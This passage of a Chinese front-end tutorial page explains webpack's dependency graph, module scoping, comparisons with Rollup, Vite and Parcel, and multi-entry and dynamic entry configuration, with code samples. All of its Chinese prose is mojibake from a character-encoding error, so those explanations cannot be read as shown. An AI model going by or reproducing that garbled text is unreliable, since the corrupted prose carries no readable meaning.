align="left">æ„å»ºä¾èµ–å…³ç³»å›¾(Dependency Graph)</td></tr><tr><td align="left">ä½œç”¨åŸŸéš”ç¦»</td><td align="left">å…¨å±€å˜é‡å†²çª<br>å‘½åæ±¡æŸ“</td><td align="left">æ¨¡å—é—­åŒ…å°è£…</td></tr><tr><td align="left">èµ„æºæ•´åˆ</td><td align="left">å¤šæ–‡ä»¶åˆ†æ•£è¯·æ±‚<br>èµ„æºç±»å‹å¤šæ ·</td><td align="left">ç»Ÿä¸€æ‰“åŒ…ç­–ç•¥<br>Loaderè½¬æ¢æœºåˆ¶</td></tr><tr><td align="left">ç”Ÿäº§ä¼˜åŒ–</td><td align="left">æœªå‹ç¼©ä»£ç <br>æœªTree Shaking<br>æ— ç¼“å­˜ä¼˜åŒ–</td><td align="left">å‹ç¼©&#x2F;æ··æ·†<br>Dead Codeæ¶ˆé™¤<br>å†…å®¹å“ˆå¸Œ</td></tr></tbody></table><p><strong>Webpackçš„æ ¸å¿ƒè§£å†³æœºåˆ¶</strong></p><p>(1) ä¾èµ–å›¾è°±æ„å»º</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// webpackå†…éƒ¨ç”Ÿæˆçš„ä¾èµ–å›¾è°±ç‰‡æ®µ</span><br>&#123;<br>  <span class="hljs-string">&#x27;./src/index.js&#x27;</span>: &#123;<br>    <span class="hljs-attr">dependencies</span>: [<span class="hljs-string">&#x27;./header.js&#x27;</span>, <span class="hljs-string">&#x27;./sidebar.js&#x27;</span>],<br>    <span class="hljs-attr">code</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-variable language_">module</span>, <span class="hljs-built_in">exports</span>, <span class="hljs-built_in">require</span></span>) &#123;<br>      <span class="hljs-keyword">const</span> header = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./header.js&#x27;</span>);<br>      <span class="hljs-keyword">const</span> sidebar = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./sidebar.js&#x27;</span>);<br>    &#125;<br>  &#125;,<br>  <span class="hljs-string">&#x27;./header.js&#x27;</span>: &#123; <span class="hljs-comment">/* ... */</span> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) ä½œç”¨åŸŸéš”ç¦»ï¼ˆæ¨¡å—å°è£…ï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ‰“åŒ…åçš„æ¨¡å—ä»£ç </span><br>(<span class="hljs-function">() =&gt;</span> &#123; <span class="hljs-comment">// è‡ªæ‰§è¡Œå‡½æ•°åˆ›å»ºé—­åŒ…</span><br>  <span class="hljs-keyword">var</span> __webpack_modules__ = &#123;<br>    <span class="hljs-string">&#x27;./src/math.js&#x27;</span>: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-variable language_">module</span></span>) =&gt;</span> &#123;<br>      <span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>        <span class="hljs-attr">add</span>: <span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b,<br>        <span class="hljs-attr">pi</span>: <span class="hljs-number">3.14159</span><br>      &#125;<br>    &#125;<br>  &#125;;<br>&#125;)();<br></code></pre></td></tr></table></figure><p>(3) èµ„æºç»Ÿä¸€å¤„ç†æµç¨‹</p><pre class="mermaid">graph LRA[ES Modules] --> B[Babel Loader]B --> C[JavaScript]D[SCSS] --> E[Sass Loader]E --> F[CSS]F --> G[Style Loader]H[Images] --> I[File Loader]C --> J[æ‰“åŒ…è¾“å‡º]G --> JI --> J</pre><p><strong>æ¨¡å—åŒ–æ‰“åŒ…çš„æ ¸å¿ƒä»·å€¼</strong></p><ul><li>å¼€å‘æ•ˆç‡æå‡<ul><li>çœŸæ­£çš„ç»„ä»¶åŒ–å¼€å‘</li><li>ä¾èµ–è‡ªåŠ¨è§£æ</li><li>çƒ­æ›´æ–°èƒ½åŠ›</li></ul></li><li>æ€§èƒ½ä¼˜åŒ–åŸºç¡€<ul><li>Tree Shakingæ¶ˆé™¤æ— æ•ˆä»£ç </li><li>æŒ‰éœ€åŠ è½½ï¼ˆCode Splittingï¼‰</li><li>é•¿æ•ˆç¼“å­˜ï¼ˆContent Hashï¼‰</li></ul></li><li>å·¥ç¨‹åŒ–æ”¯æ’‘<ul><li>ç»Ÿä¸€æ„å»ºæµç¨‹</li><li>å¤šç¯å¢ƒé€‚é…</li><li>è´¨é‡ä¿éšœï¼ˆLint&#x2F;Testé›†æˆï¼‰</li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åŸå§‹ä»£ç </span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">used</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/*...*/</span> &#125;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">unused</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/*...*/</span> &#125;<br><br><span class="hljs-comment">// æ‰“åŒ…åï¼ˆæœªå¼•ç”¨çš„unusedè¢«ç§»é™¤ï¼‰</span><br><span class="hljs-comment">/* harmony export */</span> __webpack_exports__[<span class="hljs-string">&quot;used&quot;</span>] = used;<br></code></pre></td></tr></table></figure><p><strong>é¢è¯•é‡ç‚¹è§£æ</strong></p><ul><li>ä¸ºä»€ä¹ˆç°ä»£å‰ç«¯éœ€è¦æ‰“åŒ…å·¥å…·ï¼Ÿ</li><li>Webpackå¦‚ä½•è§£å†³æ¨¡å—å¾ªç¯ä¾èµ–é—®é¢˜ï¼Ÿ</li></ul><h3 id="1-1-2-ä¸Rollup-Vite-Parcelçš„å¯¹æ¯”ï¼ˆé€‚ç”¨åœºæ™¯å·®å¼‚ï¼‰"><a href="#1-1-2-ä¸Rollup-Vite-Parcelçš„å¯¹æ¯”ï¼ˆé€‚ç”¨åœºæ™¯å·®å¼‚ï¼‰" class="headerlink" title="1.1.2 ä¸Rollup&#x2F;Vite&#x2F;Parcelçš„å¯¹æ¯”ï¼ˆé€‚ç”¨åœºæ™¯å·®å¼‚ï¼‰"></a>1.1.2 ä¸Rollup&#x2F;Vite&#x2F;Parcelçš„å¯¹æ¯”ï¼ˆé€‚ç”¨åœºæ™¯å·®å¼‚ï¼‰</h3><p><strong>ä¸»æµæ„å»ºå·¥å…·æ ¸å¿ƒå®šä½å¯¹æ¯”</strong></p><table><thead><tr><th align="left">å·¥å…·</th><th align="left">æ ¸å¿ƒå®šä½</th><th align="left">è®¾è®¡å“²å­¦</th><th align="left">å…¸å‹ç”¨æˆ·</th></tr></thead><tbody><tr><td align="left">Webpack</td><td align="left">å…¨èƒ½å‹æ¨¡å—æ‰“åŒ…å™¨</td><td align="left">â€œä¸€åˆ‡çš†æ¨¡å—â€</td><td align="left">å¤æ‚SPAåº”ç”¨</td></tr><tr><td align="left">Rollup</td><td align="left">ESæ¨¡å—æ‰“åŒ…å™¨</td><td align="left">â€œè¾“å‡ºæœ€ç®€æ´çš„åº“ä»£ç â€</td><td align="left">åº“&#x2F;æ¡†æ¶å¼€å‘è€…</td></tr><tr><td align="left">Vite</td><td align="left">ä¸‹ä¸€ä»£å‰ç«¯å·¥å…·é“¾</td><td align="left">â€œåŸç”ŸESM + æŒ‰éœ€ç¼–è¯‘â€</td><td align="left">ç°ä»£æ¡†æ¶é¡¹ç›®</td></tr><tr><td align="left">Parcel</td><td align="left">é›¶é…ç½®æ‰“åŒ…å™¨</td><td align="left">â€œå¼€ç®±å³ç”¨â€</td><td align="left">å¿«é€ŸåŸå‹å¼€å‘</td></tr></tbody></table><p><strong>æ¶æ„åŸç†å·®å¼‚</strong></p><p>(1) webpack</p><pre class="mermaid">graph LRA[Entry] --> B[é€’å½’æ„å»ºä¾èµ–å›¾]B --> C[Loaderå¤„ç†èµ„æº]C --> D[Pluginä¼˜åŒ–]D --> E[Chunkåˆ†å‰²]E --> F[è¾“å‡ºBundle]</pre><p>(2) rollup</p><pre class="mermaid">graph LRA[ESMå…¥å£] --> B[é™æ€åˆ†æä¾èµ–æ ‘]B --> C[Tree-Shaking]C --> D[ä½œç”¨åŸŸæå‡]D --> E[è¾“å‡ºæ‰å¹³åŒ–Bundle]</pre><p>(3) vite</p><pre class="mermaid">graph LRA[æµè§ˆå™¨è¯·æ±‚] --> B{æ˜¯å¦ä¸ºJS/CSS?}B -->|æ˜¯| C[æŒ‰éœ€ç¼–è¯‘]B -->|å¦| D[ç›´æ¥è¿”å›]C --> E[ESMæ–¹å¼è¿”å›]</pre><p>(4) parcel</p><pre class="mermaid">graph LRA[å…¥å£æ–‡ä»¶] --> B[è‡ªåŠ¨æ£€æµ‹ä¾èµ–]B --> C[å¤šæ ¸å¹¶è¡Œå¤„ç†]C --> D[é›¶é…ç½®è¾“å‡º]</pre><p><strong>é€‚ç”¨åœºæ™¯åˆ†æ</strong></p><p>(1) Webpack é¦–é€‰åœºæ™¯</p><ul><li>ä¼ä¸šçº§å¤æ‚åº”ç”¨ï¼ˆç‰¹åˆ«æ˜¯é—ç•™ç³»ç»Ÿï¼‰</li><li>éœ€è¦æ·±åº¦å®šåˆ¶æ„å»ºæµç¨‹</li><li>å¤šé¡µé¢åº”ç”¨ï¼ˆMPAï¼‰é¡¹ç›®</li><li>éœ€è¦é›†æˆå¤§é‡ç¬¬ä¸‰æ–¹æ’ä»¶</li><li>ç¤ºä¾‹ï¼šç”µå•†åå°ç®¡ç†ç³»ç»Ÿ</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># å…¸å‹ç‰¹å¾</span><br>- 500+ç»„ä»¶<br>- éœ€è¦ä»£ç åˆ†å‰²<br>- éœ€è¦å…¼å®¹IE11<br>- é›†æˆAnt Designç­‰å¤§å‹UIåº“<br></code></pre></td></tr></table></figure><p>(2) Rollup é¦–é€‰åœºæ™¯</p><ul><li>å¼€æºåº“&#x2F;æ¡†æ¶å¼€å‘</li><li>éœ€è¦è¾“å‡ºå¤šç§æ ¼å¼çš„åŒ…ï¼ˆUMD&#x2F;ESM&#x2F;CJSï¼‰</li><li>è¿½æ±‚æœ€å°åŒ–bundleä½“ç§¯</li><li>ç¤ºä¾‹ï¼šReactç»„ä»¶åº“</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// rollup.config.js</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-attr">input</span>: <span class="hljs-string">&#x27;src/index.js&#x27;</span>,<br>  <span class="hljs-attr">output</span>: [<br>    &#123; <span class="hljs-attr">file</span>: <span class="hljs-string">&#x27;dist/library.esm.js&#x27;</span>, <span class="hljs-attr">format</span>: <span class="hljs-string">&#x27;es&#x27;</span> &#125;,<br>    &#123; <span class="hljs-attr">file</span>: <span class="hljs-string">&#x27;dist/library.cjs.js&#x27;</span>, <span class="hljs-attr">format</span>: <span class="hljs-string">&#x27;cjs&#x27;</span> &#125;<br>  ],<br>  <span class="hljs-attr">plugins</span>: [<span class="hljs-title function_">terser</span>()] <span class="hljs-comment">// ä»£ç å‹ç¼©</span><br>&#125;<br></code></pre></td></tr></table></figure><p>(3) Vite é¦–é€‰åœºæ™¯</p><ul><li>åŸºäºç°ä»£æ¡†æ¶çš„æ–°é¡¹ç›®ï¼ˆVue&#x2F;React&#x2F;Svelteï¼‰</li><li>éœ€è¦æé€Ÿå¼€å‘ä½“éªŒ</li><li>ä½¿ç”¨å¤§é‡ESæ¨¡å—çš„ç°ä»£æµè§ˆå™¨é¡¹ç›®</li><li>ç¤ºä¾‹ï¼šåˆ›æ–°å‹SaaSå¹³å°</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># å¼€å‘ä½“éªŒå¯¹æ¯”</span><br>Webpackå¯åŠ¨: 15-25s <br>Viteå¯åŠ¨: &lt;500ms <br></code></pre></td></tr></table></figure><p>(4) Parcel é¦–é€‰åœºæ™¯</p><ul><li>å¿«é€ŸåŸå‹å¼€å‘</li><li>é™æ€ç½‘ç«™ç”Ÿæˆ</li><li>ä¸éœ€è¦å¤æ‚é…ç½®çš„å°å‹é¡¹ç›®</li><li>ç¤ºä¾‹ï¼šä¸ªäººåšå®¢ç½‘ç«™</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># é›¶é…ç½®ä½¿ç”¨</span><br>parcel build index.html <br><span class="hljs-comment"># è‡ªåŠ¨å¤„ç†ï¼š</span><br><span class="hljs-comment"># - Sass â†’ CSS</span><br><span class="hljs-comment"># - TypeScript â†’ JavaScript</span><br><span class="hljs-comment"># - å›¾ç‰‡ä¼˜åŒ–</span><br></code></pre></td></tr></table></figure><p><strong>é¢è¯•é«˜é¢‘é—®é¢˜è§£æ</strong></p><p>(1) ä¸ºä»€ä¹ˆViteå¼€å‘ç¯å¢ƒæ¯”Webpackå¿«ï¼Ÿ</p><ul><li>åŸºäºæµè§ˆå™¨åŸç”ŸESæ¨¡å—ç³»ç»Ÿ</li><li>æŒ‰éœ€ç¼–è¯‘ï¼ˆéå…¨é‡æ‰“åŒ…ï¼‰</li><li>ä½¿ç”¨ESBuildé¢„æ„å»ºï¼ˆGoè¯­è¨€ç¼–å†™ï¼Œæ¯”JSå¿«10-100å€ï¼‰</li></ul><h2 id="1-2-æ ¸å¿ƒé…ç½®é¡¹è§£æ"><a href="#1-2-æ ¸å¿ƒé…ç½®é¡¹è§£æ" class="headerlink" title="1.2 æ ¸å¿ƒé…ç½®é¡¹è§£æ"></a>1.2 æ ¸å¿ƒé…ç½®é¡¹è§£æ</h2><h3 id="1-2-1-entryï¼šå¤šå…¥å£ã€åŠ¨æ€å…¥å£è®¾è®¡"><a href="#1-2-1-entryï¼šå¤šå…¥å£ã€åŠ¨æ€å…¥å£è®¾è®¡" class="headerlink" title="1.2.1 entryï¼šå¤šå…¥å£ã€åŠ¨æ€å…¥å£è®¾è®¡"></a>1.2.1 <code>entry</code>ï¼šå¤šå…¥å£ã€åŠ¨æ€å…¥å£è®¾è®¡</h3><p><strong>å…¥å£(Entry)çš„æ ¸å¿ƒæ¦‚å¿µ</strong></p><p>åŸºæœ¬å®šä¹‰ï¼š</p><ul><li>å…¥å£èµ·ç‚¹(entry point)ï¼šWebpackæ„å»ºä¾èµ–å›¾çš„èµ·å§‹æ¨¡å—</li><li>å•å…¥å£åŸºç¡€é…ç½®ï¼š</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">entry</span>: <span class="hljs-string">&#x27;./src/index.js&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å…¥å£çš„åº•å±‚å®ç°:</p><pre class="mermaid">graph LR  A[Entry] --> B[åˆ›å»ºä¾èµ–å›¾]  B --> C[é€’å½’è§£æä¾èµ–]  C --> D[ç”ŸæˆChunk]</pre><p><strong>å¤šå…¥å£é…ç½®å®æˆ˜</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">entry</span>: &#123;<br>    <span class="hljs-attr">main</span>: <span class="hljs-string">&#x27;./src/app.js&#x27;</span>,<br>    <span class="hljs-attr">admin</span>: <span class="hljs-string">&#x27;./src/admin.js&#x27;</span>,<br>    <span class="hljs-attr">vendor</span>: [<span class="hljs-string">&#x27;react&#x27;</span>, <span class="hljs-string">&#x27;react-dom&#x27;</span>]<br>  &#125;,<br>  <span class="hljs-attr">output</span>: &#123;<br>    <span class="hljs-attr">filename</span>: <span class="hljs-string">&#x27;[name].bundle.js&#x27;</span> <span class="hljs-comment">// è¾“å‡º main.bundle.js, admin.bundle.js</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>åŠ¨æ€å…¥å£é«˜çº§æŠ€å·§</strong></p><p>(1) å‡½æ•°å¼åŠ¨æ€å…¥åº“</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ ¹æ®ç¯å¢ƒå˜é‡åŠ¨æ€ç”Ÿæˆå…¥å£</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">entry</span>: <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> entries = &#123;<br>      <span class="hljs-attr">main</span>: <span class="hljs-string">&#x27;./src/app.js&#x27;</span><br>    &#125;;<br>    <br>    <span class="hljs-keyword">if</span> (process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">&#x27;development&#x27;</span>) &#123;<br>      entries.<span class="hljs-property">debug</span> = <span class="hljs-string">&#x27;./src/debugPanel.js&#x27;</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">if</span> (process.<span class="hljs-property">env</span>.<span class="hljs-property">BUILD_TARGET</span> === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>      entries.<span class="hljs-property">admin</span> = <span class="hljs-string">&#x27;./src/admin.js&#x27;</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> entries;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) æ–‡ä»¶ç³»ç»Ÿé©±åŠ¨å…¥å£</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><br><span class="hljs-comment">// è‡ªåŠ¨æ‰«æpagesç›®å½•åˆ›å»ºå…¥å£</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">generateEntries</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> pagesDir = path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;src/pages&#x27;</span>);<br>  <span class="hljs-keyword">return</span> fs.<span class="hljs-title function_">readdirSync</span>(pagesDir).<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">entries, page</span>) =&gt;</span> &#123;<br>    entries[page] = path.<span class="hljs-title function_">join</span>(pagesDir, page, <span class="hljs-string">&#x27;index.js&#x27;</span>);<br>    <span class="hljs-keyword">return</span> entries;<br>  &#125;, &#123;&#125;);<br>&#125;<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">entry</span>: <span class="hljs-title function_">generateEntries</span>()<br>&#125;<br></code></pre></td></tr></table></figure><p>(3) è¿œç¨‹é…ç½®å…¥å£ï¼ˆå¾®å‰ç«¯åœºæ™¯ï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">entry</span>: <span class="hljs-title function_">async</span> () =&gt; &#123;<br>    <span class="hljs-comment">// ä»é…ç½®æœåŠ¡å™¨è·å–å…¥å£é…ç½®</span><br>    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://config-server.com/entries&#x27;</span>);<br>    <span class="hljs-keyword">const</span> remoteConfig = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>    <br>    <span class="hljs-keyword">return</span> &#123;<br>      <span class="hljs-attr">main</span>: <span class="hljs-string">&#x27;./src/app.js&#x27;</span>,<br>      ...remoteConfig.<span class="hljs-property">modules</span><br>    &#125;;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ€§èƒ½ä¼˜åŒ–ç­–ç•¥</strong></p><p>(1) å…¥å£ä¾èµ–ä¼˜åŒ–</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">entry</span>: &#123;<br>    <span class="hljs-attr">app</span>: &#123;<br>      <span class="hljs-attr">import</span>: <span class="hljs-string">&#x27;./src/app.js&#x27;</span>,<br>      <span class="hljs-attr">dependOn</span>: <span class="hljs-string">&#x27;shared&#x27;</span> <span class="hljs-comment">// å…±äº«ä¾èµ–</span><br>    &#125;,<br>    <span class="hljs-attr">dashboard</span>: &#123;<br>      <span class="hljs-attr">import</span>: <span class="hljs-string">&#x27;./src/dashboard.js&#x27;</span>,<br>      <span class="hljs-attr">dependOn</span>: <span class="hljs-string">&#x27;shared&#x27;</span><br>    &#125;,<br>    <span class="hljs-attr">shared</span>: [<span class="hljs-string">&#x27;react&#x27;</span>, <span class="hljs-string">&#x27;react-dom&#x27;</span>] <span class="hljs-comment">// å…¬å…±æ¨¡å—</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) åŠ¨æ€å…¥å£æ‡’åŠ è½½</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// è¿è¡Œæ—¶åŠ¨æ€åŠ è½½å…¥å£ï¼ˆé€‚ç”¨äºæ’ä»¶ç³»ç»Ÿï¼‰</span><br>button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">import</span>(<span class="hljs-comment">/* webpackIgnore: false */</span> <span class="hljs-string">&#x27;/plugins/&#x27;</span> + pluginName + <span class="hljs-string">&#x27;/entry.js&#x27;</span>)<br>    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">module</span> =&gt;</span> <span class="hljs-variable language_">module</span>.<span class="hljs-title function_">init</span>());<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>å¸¸è§é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ</strong></p><p>(1) å…¥å£æ–‡ä»¶è¿‡å¤§é—®é¢˜</p><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">entry</span>: &#123;<br>  <span class="hljs-attr">main</span>: &#123;<br>    <span class="hljs-attr">import</span>: <span class="hljs-string">&#x27;./src/app.js&#x27;</span>,<br>    <span class="hljs-attr">filename</span>: <span class="hljs-string">&#x27;main/[name].js&#x27;</span>, <span class="hljs-comment">// è‡ªå®šä¹‰è¾“å‡ºè·¯å¾„</span><br>    <span class="hljs-attr">dependOn</span>: <span class="hljs-string">&#x27;vendors&#x27;</span><br>  &#125;,<br>  <span class="hljs-attr">vendors</span>: [<span class="hljs-string">&#x27;react&#x27;</span>, <span class="hljs-string">&#x27;lodash&#x27;</span>]<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) å¾ªç¯ä¾èµ–è­¦å‘Š</p><p>ä¿®å¤æ–¹æ¡ˆï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é‡æ„æ¨¡å—ç»“æ„æˆ–ä½¿ç”¨åŠ¨æ€å¯¼å…¥</span><br><span class="hljs-comment">// é”™è¯¯ç¤ºä¾‹</span><br><span class="hljs-comment">// a.js</span><br><span class="hljs-keyword">import</span> &#123; b &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./b.js&#x27;</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">a</span> = (<span class="hljs-params"></span>) =&gt; <span class="hljs-title function_">b</span>();<br><br><span class="hljs-comment">// b.js</span><br><span class="hljs-keyword">import</span> &#123; a &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./a.js&#x27;</span>; <span class="hljs-comment">// å¾ªç¯ä¾èµ–</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">b</span> = (<span class="hljs-params"></span>) =&gt; <span class="hljs-title function_">a</span>();<br><br><span class="hljs-comment">// æ­£ç¡®æ–¹æ¡ˆ</span><br><span class="hljs-comment">// b.js</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">b</span> = (<span class="hljs-params"></span>) =&gt; <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./a.js&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">m</span> =&gt;</span> m.<span class="hljs-title function_">a</span>());<br></code></pre></td></tr></table></figure><p><strong>é¢è¯•é‡ç‚¹è§£æ</strong></p><p>(1) å¤šå…¥å£åº”ç”¨å¦‚ä½•å…±äº«ä»£ç ï¼Ÿ</p><ul><li>ä½¿ç”¨dependOnæ˜¾å¼å£°æ˜å…±äº«æ¨¡å—</li><li>é…ç½®SplitChunksPluginè‡ªåŠ¨æå–å…¬å…±ä»£ç </li></ul><p>(2) åŠ¨æ€å…¥å£åœ¨å¾®å‰ç«¯ä¸­çš„åº”ç”¨ï¼Ÿ</p><ul><li>ä¸»åº”ç”¨é€šè¿‡åŠ¨æ€å…¥å£åŠ è½½å­åº”ç”¨</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">entry</span>: &#123;<br>  <span class="hljs-attr">mainApp</span>: <span class="hljs-string">&#x27;./main.js&#x27;</span>,<br>  <span class="hljs-attr">childApp1</span>: <span 